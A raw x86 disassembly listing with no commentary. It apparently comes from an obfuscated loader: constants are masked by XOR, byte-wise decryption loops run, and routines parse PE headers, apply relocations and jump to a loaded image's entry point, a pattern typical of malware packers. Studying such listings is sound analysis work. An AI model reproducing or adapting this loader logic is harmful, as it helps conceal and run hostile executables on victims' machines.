  4264a7:	add    ecx,esi
  4264a9:	push   ecx
  4264aa:	call   DWORD PTR [eax+0x14]
  4264ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4264b0:	xor    ecx,ebx
  4264b2:	add    ecx,esi
  4264b4:	mov    DWORD PTR [ebp-0x20],eax
  4264b7:	cmp    ecx,edi
  4264b9:	je     0x426846
  4264bf:	mov    ecx,DWORD PTR [ebp-0xc]
  4264c2:	xor    ecx,ebx
  4264c4:	add    ecx,esi
  4264c6:	cmp    ecx,eax
  4264c8:	je     0x426846
  4264ce:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  4264d5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4264dc:	mov    ecx,DWORD PTR [ebp-0x3c]
  4264df:	xor    cl,0xaa
  4264e2:	sub    cl,0xf
  4264e5:	mov    BYTE PTR [edi],cl
  4264e7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264ea:	xor    cl,0xaa
  4264ed:	sub    cl,0xf
  4264f0:	mov    BYTE PTR [edi+0x1],cl
  4264f3:	mov    ecx,DWORD PTR [ebp-0x54]
  4264f6:	xor    cl,0xaa
  4264f9:	sub    cl,0xf
  4264fc:	mov    BYTE PTR [edi+0x2],cl
  4264ff:	and    DWORD PTR [ebp-0xc8],0x0
  426506:	and    DWORD PTR [ebp-0xdc],0x0
  42650d:	lea    ecx,[ebp-0xdc]
  426513:	push   ecx
  426514:	push   DWORD PTR [ebp-0x14]
  426517:	push   eax
  426518:	lea    eax,[ebp-0xc8]
  42651e:	push   eax
  42651f:	mov    eax,DWORD PTR [ebp-0x30]
  426522:	push   DWORD PTR [eax+0xc]
  426525:	mov    eax,DWORD PTR [ebp-0x24]
  426528:	add    eax,0x10
  42652b:	push   eax
  42652c:	push   edi
  42652d:	call   0x4257d4
  426532:	mov    DWORD PTR [ebp-0x3c],eax
  426535:	mov    eax,DWORD PTR [ebp+0x8]
  426538:	mov    ecx,DWORD PTR [ebp-0x50]
  42653b:	mov    eax,DWORD PTR [eax+0x1e0]
  426541:	xor    ecx,ebx
  426543:	add    ecx,esi
  426545:	push   ecx
  426546:	mov    ecx,DWORD PTR [ebp-0xc]
  426549:	xor    ecx,ebx
  42654b:	add    ecx,esi
  42654d:	push   ecx
  42654e:	push   edi
  42654f:	call   DWORD PTR [eax+0x18]
  426552:	mov    eax,DWORD PTR [ebp-0x3c]
  426555:	add    eax,0xffcd8d0f
  42655a:	xor    eax,ebx
  42655c:	cmp    eax,0xf89c85a5
  426561:	mov    eax,DWORD PTR [ebp+0x8]
  426564:	mov    eax,DWORD PTR [eax+0x1e0]
  42656a:	mov    ecx,DWORD PTR [ebp-0x50]
  42656d:	jne    0x426590
  42656f:	xor    ecx,ebx
  426571:	add    ecx,esi
  426573:	push   ecx
  426574:	mov    ecx,DWORD PTR [ebp-0xc]
  426577:	xor    ecx,ebx
  426579:	add    ecx,esi
  42657b:	push   ecx
  42657c:	push   DWORD PTR [ebp-0x24]
  42657f:	call   DWORD PTR [eax+0x18]
  426582:	mov    eax,DWORD PTR [ebp-0x20]
  426585:	mov    DWORD PTR [ebp-0x24],eax
  426588:	mov    eax,DWORD PTR [ebp-0x14]
  42658b:	mov    DWORD PTR [ebp-0x40],eax
  42658e:	jmp    0x4265a3
  426590:	xor    ecx,ebx
  426592:	add    ecx,esi
  426594:	push   ecx
  426595:	mov    ecx,DWORD PTR [ebp-0xc]
  426598:	xor    ecx,ebx
  42659a:	add    ecx,esi
  42659c:	push   ecx
  42659d:	push   DWORD PTR [ebp-0x20]
  4265a0:	call   DWORD PTR [eax+0x18]
  4265a3:	mov    eax,DWORD PTR [ebp-0x40]
  4265a6:	mov    DWORD PTR [ebp-0x38],eax
  4265a9:	mov    eax,DWORD PTR [ebp-0x24]
  4265ac:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  4265b3:	mov    DWORD PTR [ebp-0x3c],eax
  4265b6:	mov    edi,0xf89c85ba
  4265bb:	mov    DWORD PTR [ebp-0x2c],edi
  4265be:	mov    eax,DWORD PTR [ebp-0x28]
  4265c1:	xor    eax,ebx
  4265c3:	add    eax,esi
  4265c5:	mov    DWORD PTR [ebp-0xc],eax
  4265c8:	mov    eax,DWORD PTR [ebp-0x28]
  4265cb:	xor    eax,ebx
  4265cd:	add    eax,esi
  4265cf:	mov    DWORD PTR [ebp-0x14],eax
  4265d2:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4265d9:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  4265e0:	mov    eax,DWORD PTR [ebp-0x28]
  4265e3:	mov    ecx,DWORD PTR [ebp-0x38]
  4265e6:	xor    eax,ebx
  4265e8:	add    eax,esi
  4265ea:	cmp    ecx,eax
  4265ec:	je     0x4267e2
  4265f2:	jmp    0x4267be
  4265f7:	mov    ecx,DWORD PTR [ebp-0xc]
  4265fa:	mov    eax,DWORD PTR [ebp-0x38]
  4265fd:	sub    eax,ecx
  4265ff:	mov    ecx,DWORD PTR [ebp-0x48]
  426602:	xor    ecx,ebx
  426604:	add    ecx,esi
  426606:	xor    edx,edx
  426608:	div    ecx
  42660a:	mov    DWORD PTR [ebp-0x14],eax
  42660d:	mov    eax,DWORD PTR [ebp-0x20]
  426610:	mov    ecx,DWORD PTR [ebp-0x14]
  426613:	xor    eax,ebx
  426615:	add    eax,esi
  426617:	cmp    ecx,eax
  426619:	jbe    0x426625
  42661b:	mov    eax,DWORD PTR [ebp-0x20]
  42661e:	xor    eax,ebx
  426620:	add    eax,esi
  426622:	mov    DWORD PTR [ebp-0x14],eax
  426625:	mov    eax,DWORD PTR [ebp-0x48]
  426628:	mov    ecx,DWORD PTR [ebp-0x14]
  42662b:	xor    eax,ebx
  42662d:	add    eax,esi
  42662f:	imul   eax,ecx
  426632:	mov    DWORD PTR [ebp-0x14],eax
  426635:	mov    eax,DWORD PTR [ebp-0x28]
  426638:	mov    ecx,DWORD PTR [ebp-0x14]
  42663b:	xor    eax,ebx
  42663d:	add    eax,esi
  42663f:	cmp    ecx,eax
  426641:	je     0x4267ac
  426647:	mov    eax,DWORD PTR [ebp-0x14]
  42664a:	mov    DWORD PTR [ebp-0x34],eax
  42664d:	mov    eax,DWORD PTR [ebp-0xc]
  426650:	add    eax,DWORD PTR [ebp-0x3c]
  426653:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  42665a:	mov    DWORD PTR [ebp-0x14],edi
  42665d:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  426664:	mov    DWORD PTR [ebp-0x1c],eax
  426667:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42666e:	mov    DWORD PTR [ebp-0x8],edi
  426671:	mov    eax,DWORD PTR [ebp-0x4c]
  426674:	xor    eax,ebx
  426676:	add    eax,esi
  426678:	jmp    0x42676b
  42667d:	mov    DWORD PTR [ebp-0xe4],0xf89c85b0
  426687:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426691:	mov    eax,DWORD PTR [ebp-0x8]
  426694:	mov    ecx,DWORD PTR [ebp-0x18]
  426697:	xor    eax,ebx
  426699:	add    eax,esi
  42669b:	imul   eax,ecx
  42669e:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266a1:	mov    al,BYTE PTR [eax+ecx*1]
  4266a4:	mov    BYTE PTR [ebp-0x1],al
  4266a7:	mov    eax,DWORD PTR [ebp-0x8]
  4266aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4266ad:	xor    eax,ebx
  4266af:	add    eax,esi
  4266b1:	imul   eax,ecx
  4266b4:	mov    ecx,DWORD PTR [ebp-0x54]
  4266b7:	xor    ecx,ebx
  4266b9:	add    eax,ecx
  4266bb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4266be:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4266c6:	mov    ecx,DWORD PTR [ebp-0xe4]
  4266cc:	xor    ecx,ebx
  4266ce:	lea    eax,[ecx+eax*1+0x3272f1]
  4266d5:	movzx  ecx,BYTE PTR [ebp-0x1]
  4266d9:	xor    ecx,eax
  4266db:	mov    BYTE PTR [ebp-0x1],cl
  4266de:	mov    al,BYTE PTR [ebp-0x1]
  4266e1:	mov    ecx,DWORD PTR [ebp-0x8]
  4266e4:	mov    edx,DWORD PTR [ebp-0x18]
  4266e7:	xor    ecx,ebx
  4266e9:	add    ecx,esi
  4266eb:	imul   ecx,edx
  4266ee:	mov    edx,DWORD PTR [ebp-0x1c]
  4266f1:	mov    BYTE PTR [ecx+edx*1],al
  4266f4:	mov    eax,DWORD PTR [ebp-0x8]
  4266f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4266fa:	xor    eax,ebx
  4266fc:	add    eax,esi
  4266fe:	imul   eax,ecx
  426701:	mov    ecx,DWORD PTR [ebp-0x1c]
  426704:	mov    al,BYTE PTR [eax+ecx*1]
  426707:	mov    BYTE PTR [ebp-0x1],al
  42670a:	mov    eax,DWORD PTR [ebp-0x8]
  42670d:	mov    ecx,DWORD PTR [ebp-0x18]
  426710:	xor    eax,ebx
  426712:	add    eax,esi
  426714:	imul   eax,ecx
  426717:	mov    ecx,DWORD PTR [ebp-0x14]
  42671a:	xor    ecx,ebx
  42671c:	add    eax,ecx
  42671e:	mov    ecx,DWORD PTR [ebp-0x1c]
  426721:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426729:	mov    ecx,DWORD PTR [ebp-0xd0]
  42672f:	xor    ecx,ebx
  426731:	lea    eax,[ecx+eax*1+0x3272f1]
  426738:	movzx  ecx,BYTE PTR [ebp-0x1]
  42673c:	xor    ecx,eax
  42673e:	mov    BYTE PTR [ebp-0x1],cl
  426741:	mov    al,BYTE PTR [ebp-0x1]
  426744:	mov    ecx,DWORD PTR [ebp-0x8]
  426747:	mov    edx,DWORD PTR [ebp-0x18]
  42674a:	xor    ecx,ebx
  42674c:	add    ecx,esi
  42674e:	imul   ecx,edx
  426751:	mov    edx,DWORD PTR [ebp-0x1c]
  426754:	mov    BYTE PTR [ecx+edx*1],al
  426757:	mov    eax,DWORD PTR [ebp-0x30]
  42675a:	mov    ecx,DWORD PTR [ebp-0x14]
  42675d:	xor    eax,ebx
  42675f:	xor    ecx,ebx
  426761:	add    eax,esi
  426763:	add    ecx,esi
  426765:	imul   eax,ecx
  426768:	add    eax,DWORD PTR [ebp-0x18]
  42676b:	mov    DWORD PTR [ebp-0x18],eax
  42676e:	mov    eax,DWORD PTR [ebp-0x18]
  426771:	mov    ecx,DWORD PTR [ebp-0x34]
  426774:	cmp    ecx,eax
  426776:	jb     0x42667d
  42677c:	mov    eax,DWORD PTR [ebp-0x14]
  42677f:	mov    ecx,DWORD PTR [ebp-0x34]
  426782:	xor    eax,ebx
  426784:	add    eax,esi
  426786:	imul   eax,ecx
  426789:	mov    ecx,DWORD PTR [ebp-0x4c]
  42678c:	xor    ecx,ebx
  42678e:	add    ecx,esi
  426790:	or     eax,ecx
  426792:	mov    ecx,DWORD PTR [ebp-0x2c]
  426795:	xor    ecx,ebx
  426797:	add    eax,ecx
  426799:	mov    ecx,DWORD PTR [ebp-0x2c]
  42679c:	xor    ecx,ebx
  42679e:	add    eax,ecx
  4267a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4267a3:	lea    eax,[eax+ecx*1+0x64e5e2]
  4267aa:	jmp    0x4267bb
  4267ac:	mov    eax,DWORD PTR [ebp-0x2c]
  4267af:	mov    ecx,DWORD PTR [ebp-0xc]
  4267b2:	xor    eax,ebx
  4267b4:	lea    eax,[eax+ecx*1+0x3272f1]
  4267bb:	mov    DWORD PTR [ebp-0xc],eax
  4267be:	mov    eax,DWORD PTR [ebp-0x2c]
  4267c1:	xor    eax,ebx
  4267c3:	mov    ecx,0xffcd8d0f
  4267c8:	sub    ecx,eax
  4267ca:	add    ecx,DWORD PTR [ebp-0x38]
  4267cd:	mov    eax,DWORD PTR [ebp-0x2c]
  4267d0:	mov    edx,DWORD PTR [ebp-0xc]
  4267d3:	xor    eax,ebx
  4267d5:	add    eax,esi
  4267d7:	imul   eax,edx
  4267da:	cmp    eax,ecx
  4267dc:	jbe    0x4265f7
  4267e2:	push   DWORD PTR [ebp+0x8]
  4267e5:	mov    eax,DWORD PTR [ebp+0x8]
  4267e8:	push   DWORD PTR [eax+0x1cc]
  4267ee:	lea    eax,[ebp-0xd8]
  4267f4:	push   eax
  4267f5:	mov    eax,DWORD PTR [ebp+0x8]
  4267f8:	mov    eax,DWORD PTR [eax+0x1c4]
  4267fe:	push   DWORD PTR [eax]
  426800:	mov    eax,DWORD PTR [ebp+0x8]
  426803:	mov    eax,DWORD PTR [eax+0x1c0]
  426809:	push   DWORD PTR [eax]
  42680b:	push   DWORD PTR [ebp-0x40]
  42680e:	push   DWORD PTR [ebp-0x24]
  426811:	call   0x4272a8
  426816:	mov    DWORD PTR [ebp-0x3c],eax
  426819:	mov    eax,DWORD PTR [ebp-0x10]
  42681c:	mov    ecx,DWORD PTR [ebp-0x24]
  42681f:	xor    eax,ebx
  426821:	add    eax,esi
  426823:	cmp    eax,ecx
  426825:	je     0x426846
  426827:	mov    eax,DWORD PTR [ebp+0x8]
  42682a:	mov    ecx,DWORD PTR [ebp-0x50]
  42682d:	mov    eax,DWORD PTR [eax+0x1e0]
  426833:	xor    ecx,ebx
  426835:	add    ecx,esi
  426837:	push   ecx
  426838:	mov    ecx,DWORD PTR [ebp-0x10]
  42683b:	xor    ecx,ebx
  42683d:	add    ecx,esi
  42683f:	push   ecx
  426840:	push   DWORD PTR [ebp-0x24]
  426843:	call   DWORD PTR [eax+0x18]
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	leave  
  42684a:	ret    0x4
  42684d:	push   ebp
  42684e:	mov    ebp,esp
  426850:	push   ecx
  426851:	push   ecx
  426852:	lea    eax,[ebp-0x8]
  426855:	mov    DWORD PTR [ebp-0x4],eax
  426858:	push   esi
  426859:	mov    esi,DWORD PTR [ebp-0x4]
  42685c:	mov    eax,0xf881ba2f
  426861:	mov    DWORD PTR [esi],eax
  426863:	mov    esi,DWORD PTR [ebp-0x8]
  426866:	cmp    esi,eax
  426868:	pop    esi
  426869:	jne    0x426873
  42686b:	mov    BYTE PTR [ecx+0xa],0x83
  42686f:	mov    BYTE PTR [edx+0x8],0x2e
  426873:	mov    BYTE PTR [edx+0xa],0x83
  426877:	mov    BYTE PTR [ecx+0x2],0x11
  42687b:	leave  
  42687c:	ret    
  42687d:	push   ebp
  42687e:	mov    ebp,esp
  426880:	push   ecx
  426881:	push   ecx
  426882:	lea    eax,[ebp-0x8]
  426885:	mov    DWORD PTR [ebp-0x4],eax
  426888:	mov    edx,DWORD PTR [ebp-0x4]
  42688b:	mov    eax,0xf88b0bc3
  426890:	mov    DWORD PTR [edx],eax
  426892:	mov    edx,DWORD PTR [ebp-0x8]
  426895:	cmp    edx,eax
  426897:	jne    0x4268a8
  426899:	mov    eax,DWORD PTR [ebp+0x8]
  42689c:	mov    BYTE PTR [ecx+0x9],0xf
  4268a0:	mov    BYTE PTR [eax+0x7],0x56
  4268a4:	mov    BYTE PTR [ecx+0x6],0xe
  4268a8:	mov    BYTE PTR [ecx+0x3],0x1f
  4268ac:	leave  
  4268ad:	ret    0x4
  4268b0:	push   ebp
  4268b1:	mov    ebp,esp
  4268b3:	push   ecx
  4268b4:	push   ecx
  4268b5:	lea    eax,[ebp-0x8]
  4268b8:	mov    DWORD PTR [ebp-0x4],eax
  4268bb:	mov    edx,DWORD PTR [ebp-0x4]
  4268be:	mov    eax,0x7e0da2f
  4268c3:	mov    DWORD PTR [edx],eax
  4268c5:	mov    edx,DWORD PTR [ebp-0x8]
  4268c8:	cmp    edx,eax
  4268ca:	jne    0x4268d0
  4268cc:	mov    BYTE PTR [ecx+0x7],0x56
  4268d0:	mov    eax,DWORD PTR [ebp+0x8]
  4268d3:	mov    BYTE PTR [ecx+0x1],0x14
  4268d7:	mov    BYTE PTR [eax+0x9],0x2f
  4268db:	leave  
  4268dc:	ret    0x4
  4268df:	push   ebp
  4268e0:	mov    ebp,esp
  4268e2:	push   ecx
  4268e3:	push   ecx
  4268e4:	lea    eax,[ebp-0x8]
  4268e7:	mov    DWORD PTR [ebp-0x4],eax
  4268ea:	push   esi
  4268eb:	mov    esi,DWORD PTR [ebp-0x4]
  4268ee:	mov    eax,0x7060e3c
  4268f3:	mov    DWORD PTR [esi],eax
  4268f5:	mov    esi,DWORD PTR [ebp-0x8]
  4268f8:	cmp    esi,eax
  4268fa:	pop    esi
  4268fb:	jne    0x426907
  4268fd:	mov    BYTE PTR [edx+0x4],0x12
  426901:	mov    WORD PTR [ecx+0x3],0x121f
  426907:	mov    BYTE PTR [edx],0x3e
  42690a:	leave  
  42690b:	ret    
  42690c:	push   ebp
  42690d:	mov    ebp,esp
  42690f:	push   ecx
  426910:	push   ecx
  426911:	lea    eax,[ebp-0x8]
  426914:	mov    DWORD PTR [ebp-0x4],eax
  426917:	mov    edx,DWORD PTR [ebp-0x4]
  42691a:	mov    eax,0xf8870b3f
  42691f:	mov    DWORD PTR [edx],eax
  426921:	mov    edx,DWORD PTR [ebp-0x8]
  426924:	cmp    edx,eax
  426926:	jne    0x426933
  426928:	mov    eax,DWORD PTR [ebp+0x8]
  42692b:	mov    BYTE PTR [ecx+0x8],0xe
  42692f:	mov    BYTE PTR [eax+0x1],0x14
  426933:	mov    BYTE PTR [ecx+0x5],0xa
  426937:	leave  
  426938:	ret    0x4
  42693b:	push   esi
  42693c:	mov    ecx,edi
  42693e:	call   0x42690c
  426943:	mov    edx,edi
  426945:	mov    ecx,esi
  426947:	mov    BYTE PTR [esi],0x1e
  42694a:	call   0x4268df
  42694f:	push   esi
  426950:	mov    ecx,edi
  426952:	mov    BYTE PTR [esi+0x5],0xa
  426956:	call   0x4268b0
  42695b:	push   esi
  42695c:	mov    BYTE PTR [esi+0x6],0xe
  426960:	call   0x42687d
  426965:	mov    BYTE PTR [esi+0x2],0x11
  426969:	mov    edx,esi
  42696b:	jmp    0x42684d
  426970:	push   ebp
  426971:	mov    ebp,esp
  426973:	push   ecx
  426974:	mov    ecx,DWORD PTR [edx+0x194]
  42697a:	push   esi
  42697b:	mov    esi,DWORD PTR [ebp+0x8]
  42697e:	mov    esi,DWORD PTR [esi]
  426980:	mov    DWORD PTR [ecx],esi
  426982:	mov    ecx,DWORD PTR [edx+0x194]
  426988:	mov    ecx,DWORD PTR [ecx]
  42698a:	mov    esi,DWORD PTR [edx+0x190]
  426990:	mov    DWORD PTR [esi],ecx
  426992:	mov    eax,DWORD PTR [edx+0x194]
  426998:	mov    ecx,DWORD PTR [eax]
  42699a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42699d:	add    ecx,DWORD PTR [eax]
  42699f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  4269a6:	mov    eax,DWORD PTR [ebp-0x4]
  4269a9:	movzx  ecx,WORD PTR [ecx+0x16]
  4269ad:	xor    eax,0x75108aa
  4269b2:	add    eax,0x3272f1
  4269b7:	pop    esi
  4269b8:	test   ecx,eax
  4269ba:	je     0x4269c8
  4269bc:	mov    eax,DWORD PTR [edx+0x1c8]
  4269c2:	mov    DWORD PTR [eax],0xf89c85ba
  4269c8:	leave  
  4269c9:	ret    0x4
  4269cc:	push   ebp
  4269cd:	mov    ebp,esp
  4269cf:	sub    esp,0x70
  4269d2:	and    DWORD PTR [ebp-0x20],0x0
  4269d6:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  4269dd:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  4269e4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4269eb:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4269f2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4269f9:	mov    eax,DWORD PTR [ebp+0x20]
  4269fc:	mov    eax,DWORD PTR [eax+0x194]
  426a02:	mov    DWORD PTR [ebp-0xc],eax
  426a05:	mov    eax,DWORD PTR [ebp+0x20]
  426a08:	push   ebx
  426a09:	push   esi
  426a0a:	mov    esi,DWORD PTR [eax+0x190]
  426a10:	mov    eax,DWORD PTR [ebp+0x20]
  426a13:	mov    eax,DWORD PTR [eax+0x18c]
  426a19:	mov    DWORD PTR [ebp-0x8],eax
  426a1c:	mov    eax,DWORD PTR [eax]
  426a1e:	push   edi
  426a1f:	mov    DWORD PTR [ebp-0x4],esi
  426a22:	test   eax,eax
  426a24:	jne    0x426a31
  426a26:	push   DWORD PTR [ebp+0x1c]
  426a29:	mov    edx,DWORD PTR [ebp+0x20]
  426a2c:	call   0x426970
  426a31:	mov    eax,DWORD PTR [esi]
  426a33:	mov    ebx,DWORD PTR [esi]
  426a35:	add    ebx,DWORD PTR [eax+0x3c]
  426a38:	mov    eax,DWORD PTR [ebp+0xc]
  426a3b:	mov    ecx,DWORD PTR [ebp-0x8]
  426a3e:	mov    ecx,DWORD PTR [ecx]
  426a40:	mov    esi,0x75108aa
  426a45:	xor    eax,esi
  426a47:	mov    edi,0x3272f1
  426a4c:	add    eax,edi
  426a4e:	cmp    eax,ecx
  426a50:	jne    0x426c88
  426a56:	mov    eax,DWORD PTR [ebp-0xc]
  426a59:	mov    eax,DWORD PTR [eax]
  426a5b:	mov    DWORD PTR [ebp-0x10],eax
  426a5e:	mov    eax,DWORD PTR [ebx+0x50]
  426a61:	mov    DWORD PTR [ebp-0x68],eax
  426a64:	mov    eax,DWORD PTR [ebp-0x18]
  426a67:	xor    eax,esi
  426a69:	add    eax,edi
  426a6b:	mov    DWORD PTR [ebp-0x64],eax
  426a6e:	mov    eax,DWORD PTR [ebp-0x14]
  426a71:	and    DWORD PTR [ebp-0x6c],0x0
  426a75:	xor    eax,esi
  426a77:	add    eax,edi
  426a79:	mov    DWORD PTR [ebp-0x60],eax
  426a7c:	lea    eax,[ebp-0x70]
  426a7f:	push   eax
  426a80:	mov    eax,DWORD PTR [ebp+0x8]
  426a83:	xor    eax,esi
  426a85:	add    eax,edi
  426a87:	push   eax
  426a88:	mov    eax,DWORD PTR [ebp+0x20]
  426a8b:	add    eax,0xaa
  426a90:	push   eax
  426a91:	mov    eax,DWORD PTR [ebp+0x20]
  426a94:	mov    eax,DWORD PTR [eax+0x198]
  426a9a:	mov    DWORD PTR [ebp-0x70],0x4
  426aa1:	push   DWORD PTR [eax]
  426aa3:	mov    eax,DWORD PTR [ebp+0x10]
  426aa6:	call   eax
  426aa8:	mov    ecx,DWORD PTR [ebp-0xc]
  426aab:	mov    ecx,DWORD PTR [ecx]
  426aad:	mov    edx,DWORD PTR [ebp-0x8]
  426ab0:	mov    DWORD PTR [ebp-0x6c],eax
  426ab3:	mov    DWORD PTR [ebp+0x1c],eax
  426ab6:	mov    DWORD PTR [edx],ecx
  426ab8:	mov    ecx,DWORD PTR [ebp-0x4]
  426abb:	mov    DWORD PTR [ecx],eax
  426abd:	mov    eax,DWORD PTR [ebx+0x50]
  426ac0:	mov    DWORD PTR [ebp-0x68],eax
  426ac3:	mov    eax,DWORD PTR [ebp-0x1c]
  426ac6:	xor    eax,esi
  426ac8:	add    eax,edi
  426aca:	mov    DWORD PTR [ebp-0x64],eax
  426acd:	lea    eax,[ebp-0x20]
  426ad0:	mov    DWORD PTR [ebp-0x60],eax
  426ad3:	lea    eax,[ebp-0x70]
  426ad6:	push   eax
  426ad7:	mov    eax,DWORD PTR [ebp+0x8]
  426ada:	xor    eax,esi
  426adc:	add    eax,edi
  426ade:	push   eax
  426adf:	mov    eax,DWORD PTR [ebp+0x20]
  426ae2:	add    eax,0xee
  426ae7:	push   eax
  426ae8:	mov    eax,DWORD PTR [ebp+0x20]
  426aeb:	mov    eax,DWORD PTR [eax+0x198]
  426af1:	mov    DWORD PTR [ebp-0x70],0x4
  426af8:	push   DWORD PTR [eax]
  426afa:	mov    eax,DWORD PTR [ebp+0x10]
  426afd:	call   eax
  426aff:	test   eax,eax
  426b01:	je     0x426b26
  426b03:	and    DWORD PTR [ebp+0xc],0x0
  426b07:	cmp    DWORD PTR [ebx+0x50],0x0
  426b0b:	jbe    0x426b26
  426b0d:	mov    eax,DWORD PTR [ebp+0x1c]
  426b10:	mov    ecx,DWORD PTR [ebp-0x10]
  426b13:	sub    ecx,eax
  426b15:	mov    dl,BYTE PTR [ecx+eax*1]
  426b18:	inc    DWORD PTR [ebp+0xc]
  426b1b:	mov    BYTE PTR [eax],dl
  426b1d:	mov    edx,DWORD PTR [ebp+0xc]
  426b20:	inc    eax
  426b21:	cmp    edx,DWORD PTR [ebx+0x50]
  426b24:	jb     0x426b15
  426b26:	mov    edx,DWORD PTR [ebp+0x1c]
  426b29:	mov    ecx,DWORD PTR [edx+0x3c]
  426b2c:	add    ecx,edx
  426b2e:	mov    eax,DWORD PTR [ecx+0xa0]
  426b34:	mov    ebx,DWORD PTR [ecx+0x28]
  426b37:	add    eax,edx
  426b39:	sub    edx,DWORD PTR [ebp-0x10]
  426b3c:	add    ebx,DWORD PTR [ebp+0x1c]
  426b3f:	mov    DWORD PTR [ebp+0xc],edx
  426b42:	mov    DWORD PTR [ebp-0x2c],ecx
  426b45:	mov    DWORD PTR [ebp-0x14],ebx
  426b48:	mov    DWORD PTR [ebp-0x8],0x0
  426b4f:	jmp    0x426bcb
  426b51:	add    edx,0xfffffff8
  426b54:	shr    edx,1
  426b56:	mov    DWORD PTR [ebp-0x18],edx
  426b59:	je     0x426bb7
  426b5b:	lea    edx,[eax+0x8]
  426b5e:	mov    DWORD PTR [ebp-0x4],edx
  426b61:	mov    edx,DWORD PTR [ebp-0x18]
  426b64:	mov    DWORD PTR [ebp-0x18],edx
  426b67:	mov    edx,DWORD PTR [ebp-0x4]
  426b6a:	movzx  edx,WORD PTR [edx]
  426b6d:	mov    DWORD PTR [ebp-0x24],edx
  426b70:	and    edx,0xfff
  426b76:	mov    DWORD PTR [ebp-0x28],edx
  426b79:	mov    edx,DWORD PTR [ebp-0x24]
  426b7c:	shr    edx,0xc
  426b7f:	add    edx,0xffcd8d0f
  426b85:	xor    edx,esi
  426b87:	cmp    edx,0xf89c85b8
  426b8d:	jne    0x426bae
  426b8f:	mov    edx,DWORD PTR [ebp-0x28]
  426b92:	add    edx,DWORD PTR [ebp+0x1c]
  426b95:	mov    ebx,DWORD PTR [eax]
  426b97:	cmp    DWORD PTR [ebx+edx*1],0x0
  426b9b:	je     0x426bab
  426b9d:	mov    ecx,DWORD PTR [ebp+0xc]
  426ba0:	add    ecx,DWORD PTR [ebx+edx*1]
  426ba3:	mov    ebx,DWORD PTR [eax]
  426ba5:	mov    DWORD PTR [edx+ebx*1],ecx
  426ba8:	mov    ecx,DWORD PTR [ebp-0x2c]
  426bab:	mov    ebx,DWORD PTR [ebp-0x14]
  426bae:	add    DWORD PTR [ebp-0x4],0x2
  426bb2:	dec    DWORD PTR [ebp-0x18]
  426bb5:	jne    0x426b67
  426bb7:	mov    edx,DWORD PTR [ebp-0xc]
  426bba:	add    DWORD PTR [ebp-0x8],edx
  426bbd:	mov    edx,DWORD PTR [ebp-0x8]
  426bc0:	cmp    edx,DWORD PTR [ecx+0xa4]
  426bc6:	jae    0x426bd9
  426bc8:	add    eax,DWORD PTR [ebp-0xc]
  426bcb:	mov    edx,DWORD PTR [eax+0x4]
  426bce:	mov    DWORD PTR [ebp-0xc],edx
  426bd1:	test   edx,edx
  426bd3:	jne    0x426b51
  426bd9:	mov    eax,DWORD PTR [ebp-0x10]
  426bdc:	mov    DWORD PTR [ebp-0x6c],eax
  426bdf:	mov    DWORD PTR [ebp-0x70],0x4
  426be6:	mov    eax,DWORD PTR [ecx+0x50]
  426be9:	mov    DWORD PTR [ebp-0x68],eax
  426bec:	mov    eax,DWORD PTR [ebp-0x1c]
  426bef:	xor    eax,esi
  426bf1:	add    eax,edi
  426bf3:	mov    DWORD PTR [ebp-0x64],eax
  426bf6:	lea    eax,[ebp-0x20]
  426bf9:	mov    DWORD PTR [ebp-0x60],eax
  426bfc:	lea    eax,[ebp-0x70]
  426bff:	push   eax
  426c00:	mov    eax,DWORD PTR [ebp+0x8]
  426c03:	xor    eax,esi
  426c05:	add    eax,edi
  426c07:	push   eax
  426c08:	mov    eax,DWORD PTR [ebp+0x20]
  426c0b:	add    eax,0xee
  426c10:	push   eax
  426c11:	mov    eax,DWORD PTR [ebp+0x20]
  426c14:	mov    eax,DWORD PTR [eax+0x198]
  426c1a:	push   DWORD PTR [eax]
  426c1c:	mov    eax,DWORD PTR [ebp+0x10]
  426c1f:	call   eax
  426c21:	mov    eax,DWORD PTR [ebp+0x20]
  426c24:	mov    eax,DWORD PTR [eax+0x180]
  426c2a:	add    eax,DWORD PTR [ebp+0xc]
  426c2d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c30:	push   DWORD PTR [ebp+0x18]
  426c33:	mov    DWORD PTR [eax],ecx
  426c35:	push   DWORD PTR [ebp+0x14]
  426c38:	push   DWORD PTR [ebp+0x1c]
  426c3b:	call   ebx
  426c3d:	mov    ecx,DWORD PTR [ebp+0xc]
  426c40:	add    ecx,DWORD PTR [ebp+0x20]
  426c43:	lea    eax,[ebp+0x4]
  426c46:	mov    DWORD PTR [ebp+0x20],ecx
  426c49:	mov    ecx,DWORD PTR [ebp+0x20]
  426c4c:	mov    ecx,DWORD PTR [ebp+0x20]
  426c4f:	mov    edx,DWORD PTR [ecx+0x190]
  426c55:	mov    ecx,DWORD PTR [ebp+0x20]
  426c58:	mov    ecx,DWORD PTR [ecx+0x18c]
  426c5e:	mov    esi,DWORD PTR [ecx]
  426c60:	cmp    DWORD PTR [eax],esi
  426c62:	jb     0x426c83
  426c64:	mov    esi,DWORD PTR [edx]
  426c66:	mov    edi,DWORD PTR [edx]
